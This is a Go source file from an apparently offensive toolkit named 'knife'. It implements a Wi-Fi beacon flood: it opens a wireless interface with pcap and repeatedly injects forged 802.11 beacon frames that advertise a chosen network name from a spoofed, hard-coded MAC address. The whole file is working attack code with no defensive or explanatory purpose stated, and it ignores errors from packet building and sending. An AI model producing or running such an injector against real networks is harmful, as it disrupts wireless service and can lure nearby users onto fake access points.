// knife/modules/wifi/injector.go
package wifi

import (
	"log"
	"time"

	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func InjectBeaconFlood(iface string, ssid string, count int) {
	handle, err := pcap.OpenLive(iface, 2048, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	for i := 0; i < count; i++ {
		packet := createBeaconPacket(ssid)
		handle.WritePacketData(packet)
		time.Sleep(100 * time.Millisecond)
	}
}

func createBeaconPacket(ssid string) []byte {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	addr1, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")
	addr2, _ := net.ParseMAC("00:11:22:33:44:55")
	addr3, _ := net.ParseMAC("00:11:22:33:44:55")
	dot11 := &layers.Dot11{
		Type:     layers.Dot11TypeMgmtBeacon,
		Address1: addr1,
		Address2: addr2,
		Address3: addr3,
	}
	beacon := &layers.Dot11MgmtBeacon{
		Timestamp: 0,
		Interval:  0x0064,
		// Capabilities field removed as it does not exist in Dot11MgmtBeacon
	}
	info := &layers.Dot11InformationElement{
		ID:     layers.Dot11InformationElementIDSSID,
		Length: uint8(len(ssid)),
		Info:   []byte(ssid),
	}

	gopacket.SerializeLayers(buf, opts,
		dot11,
		beacon,
		info,
	)
	return buf.Bytes()
}
